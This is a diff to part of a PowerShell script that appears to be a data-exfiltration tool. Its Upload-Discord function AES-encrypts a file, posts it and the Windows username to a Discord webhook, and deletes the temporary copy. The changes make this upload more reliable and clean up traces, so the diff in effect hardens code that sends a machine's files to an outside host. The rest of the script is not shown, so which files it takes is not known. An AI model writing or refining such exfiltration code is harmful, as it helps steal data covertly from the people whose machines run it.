@@ -530,41 +530,77 @@ function Upload-Discord {
     $key = [System.Convert]::FromBase64String($keyBase64)
     $iv = [System.Convert]::FromBase64String($ivBase64)
 
-    $hookurl = "$dc"
+    $hookurl = $dc  # Removed unnecessary string conversion
 
     # Initialize the request body for the webhook
     $Body = @{
-      'username' = $env:username
-      'content' = $text
+        'username' = $env:username
+        'content' = $text
     }
+
+    # Variable to track if we created an encrypted file
+    $encryptedFilePath = $null
 
     # Encrypt the file if it exists
-    if (Test-Path $file) {
-        # Create AES encryptor with the provided key and IV
-        $aes = [System.Security.Cryptography.Aes]::Create()
-        $aes.Key = $key
-        $aes.IV = $iv
-        $encryptor = $aes.CreateEncryptor()
+    if ($file -and (Test-Path $file)) {  # Added check for $file parameter
+        try {
+            # Create AES encryptor with the provided key and IV
+            $aes = [System.Security.Cryptography.Aes]::Create()
+            $aes.Key = $key
+            $aes.IV = $iv
+            $encryptor = $aes.CreateEncryptor()
 
-        # Encrypt the file content
-        $fileContent = [System.IO.File]::ReadAllBytes($file)
-        $encryptedContent = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
+            # Encrypt the file content
+            $fileContent = [System.IO.File]::ReadAllBytes($file)
+            $encryptedContent = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
 
-        # Save encrypted content to a temporary file
-        $encryptedFilePath = "$env:temp\encrypted_file.aes"
-        [System.IO.File]::WriteAllBytes($encryptedFilePath, $encryptedContent)
+            # Save encrypted content to a temporary file with unique name
+            $encryptedFilePath = Join-Path $env:temp "encrypted_$(Get-Random).aes"
+            [System.IO.File]::WriteAllBytes($encryptedFilePath, $encryptedContent)
+        }
+        catch {
+            Write-Error "Encryption failed: $_"
+            return
+        }
+        finally {
+            if ($aes) { $aes.Dispose() }
+        }
     }
 
-    # Send text content if provided
-    if (-not ([string]::IsNullOrEmpty($text))) {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    try {
+        # Send text content if provided
+        if (-not [string]::IsNullOrEmpty($text)) {
+            $jsonBody = $Body | ConvertTo-Json
+            $params = @{
+                Uri = $hookurl
+                Method = 'Post'
+                ContentType = 'Application/Json'
+                Body = $jsonBody
+            }
+            Invoke-RestMethod @params
+        }
+
+        # Send the encrypted file if it exists
+        if ($encryptedFilePath -and (Test-Path $encryptedFilePath)) {
+            $fileParams = @{
+                Uri = $hookurl
+                Method = 'Post'
+                Form = @{
+                    'file' = Get-Item -Path $encryptedFilePath
+                }
+            }
+            Invoke-RestMethod @fileParams
+        }
     }
-    # Send the encrypted file if it exists
-    if (Test-Path $encryptedFilePath) {
-        curl.exe -F "file1=@$encryptedFilePath" $dc
-    } else {
-    Write-Output "Error: Encrypted file not found at path: $encryptedFilePath"
-}
+    catch {
+        Write-Error "Upload failed: $_"
+    }
+    finally {
+        # Cleanup temporary encrypted file
+        if ($encryptedFilePath -and (Test-Path $encryptedFilePath)) {
+            Remove-Item -Path $encryptedFilePath -Force
+        }
+    }
 }
 
  
